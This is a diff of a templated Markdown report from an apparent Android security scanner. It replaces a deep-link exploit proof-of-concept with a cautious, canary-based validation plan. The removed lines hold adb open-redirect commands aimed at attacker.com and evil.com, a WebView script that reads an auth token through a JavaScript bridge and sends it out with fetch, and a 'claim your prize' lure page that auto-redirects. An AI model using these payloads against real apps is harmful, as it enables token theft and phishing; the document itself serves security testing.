@@ -1,102 +1,30 @@
-# PoC: Deep Link Vulnerability — {{ finding.title }}
+# Validation plan: {{ finding.title }}
 
-## Classification
-| Field | Value |
-|---|---|
-| **CWE** | {{ cwe }} |
-| **Severity** | {{ severity }} |
-| **CVSS** | {{ cvss }} |
-| **Component** | {{ class_name }} |
+**Not executed. Generated instructions are not evidence of a vulnerability.**
 
-## Description
+## Observed candidate
+- App package: `{{ package_name }}`
+- Review location: `{{ finding.file_path }}`{% if finding.line_number %}:{{ finding.line_number }}{% endif %}
+- Component label: `{{ class_name }}` (not a verified runtime entrypoint)
+- Candidate classification: {{ cwe }} / {{ severity }}
+
 {{ description }}
 
-## Prerequisites
-- Android device or emulator with ADB access
-- Target app (`{{ package_name }}`) installed
-- `adb` command-line tool
-- Browser on the device
+## Safe prerequisites
+- Preserve the original artifact hash, package/version and decompilation limitations.
+- Confirm the exact researcher-owned app, current Android build and dedicated device serial.
+- Use synthetic accounts, resources and canaries only; no unrelated apps or destinations.
+- Start with an unrooted ordinary attacker context. ADB shell, root and authorization-changing hooks do not establish ordinary-app access.
 
-## Steps to Reproduce
+## Controlled validation
+1. Use an actual declared/resolved URI and exact component from the manifest and code. The package name is not necessarily a URI scheme, and autoVerify is not proof of successful domain verification.
+2. Trace consumed path/query/extras into navigation or WebView operations and verify the effective scheme/host checks and trust boundary.
+3. Send a harmless synthetic canary through a researcher-controlled browser or ordinary-app harness. Use only separately approved researcher-controlled web origins when an origin is necessary.
+4. For a JavaScript-bridge candidate, identify the real bridge name, annotated methods, loaded origin and intended permissions. A bridge registration alone is not proof that untrusted JavaScript reaches a sensitive method.
+5. Compare valid approved and invalid unapproved inputs on the current OS. Record only observed canary behavior; a successful launch, file error or log string does not prove token theft, UXSS or account takeover.
 
-### 1. Extract Deep Link Schemes
-```bash
-# List intent filters for the app
-adb shell dumpsys package {{ package_name }} | grep -B 5 -A 10 "scheme"
-adb shell dumpsys package {{ package_name }} | grep -A 15 "android.intent.action.VIEW"
-```
+## Evidence and conclusion
+Record the exact entrypoint, attacker-controlled input, security boundary, sensitive sink, observed impact and commands/test-app source actually used. Attach redacted evidence plus successful authorized and rejected unauthorized controls. Distinguish unsupported observations, negative results and reproduced impact. No outcome or attacker capability is asserted by this plan.
 
-### 2. Craft Malicious Deep Link
-```bash
-# Test basic deep link handling
-adb shell am start -a android.intent.action.VIEW -d "{{ package_name }}://callback"
-
-# Test with redirect parameter
-adb shell am start -a android.intent.action.VIEW -d "{{ package_name }}://callback?redirect=https://attacker.com"
-adb shell am start -a android.intent.action.VIEW -d "{{ package_name }}://callback?url=https://evil.com"
-adb shell am start -a android.intent.action.VIEW -d "{{ package_name }}://callback?next=https://attacker.com"
-```
-
-{% if "CWE-601" in cwe %}
-### 3. Test Open Redirect
-```bash
-# URL encoding variations
-adb shell am start -a android.intent.action.VIEW \
-  -d "{{ package_name }}://auth?redirect_uri=https%3A%2F%2Fattacker.com"
-
-# Double encoding
-adb shell am start -a android.intent.action.VIEW \
-  -d "{{ package_name }}://auth?redirect_uri=https%253A%252F%252Fattacker.com"
-
-# Token theft via redirect
-adb shell am start -a android.intent.action.VIEW \
-  -d "{{ package_name }}://oauth/callback?code=STOLEN&redirect=https://attacker.com/collect"
-```
-{% endif %}
-
-{% if "CWE-749" in cwe %}
-### 3. Test WebView JavaScript Interface Exploitation
-```bash
-# If deep link loads URL in WebView with JS interface
-adb shell am start -a android.intent.action.VIEW \
-  -d "{{ package_name }}://webview?url=https://attacker.com/exploit.html"
-
-# Create exploit.html on attacker server:
-# <script>
-#   // Call exposed JavaScript interface
-#   var token = AndroidBridge.getAuthToken();
-#   fetch("https://attacker.com/collect?token=" + token);
-# </script>
-```
-{% endif %}
-
-### 4. Create Attacker HTML Page
-```html
-<!-- Save as exploit.html, host on a web server or local HTTP server -->
-<!DOCTYPE html>
-<html>
-<body>
-  <h1>Click to claim your prize!</h1>
-  <a href="{{ package_name }}://callback?redirect=https://attacker.com/steal">
-    Claim Now
-  </a>
-  <script>
-    // Auto-redirect after 1 second
-    setTimeout(function() {
-      window.location = "{{ package_name }}://callback?redirect=https://attacker.com/steal";
-    }, 1000);
-  </script>
-</body>
-</html>
-```
-
-## Expected Result
-- The app processes the deep link without validating the origin or destination
-- Tokens, session data, or auth codes are leaked to the attacker-controlled URL
-- The user is redirected to a phishing page
-
-## Impact
-An attacker can craft a malicious link that, when opened by the victim, steals authentication tokens, session cookies, or redirects the user to a phishing page. This can lead to full account takeover.
-
-## Remediation
-{{ remediation or "1. Validate all deep link parameters against an allowlist of trusted domains\n2. Never pass authentication tokens via URL parameters in deep links\n3. Implement origin verification for OAuth callbacks\n4. Use App Links (HTTPS) instead of custom schemes for sensitive flows\n5. Add `android:autoVerify=\"true\"` to intent filters" }}
+## Remediation after root-cause validation
+{{ remediation or "Apply the security control corresponding to the demonstrated boundary failure, preserving intended authorized functionality." }}
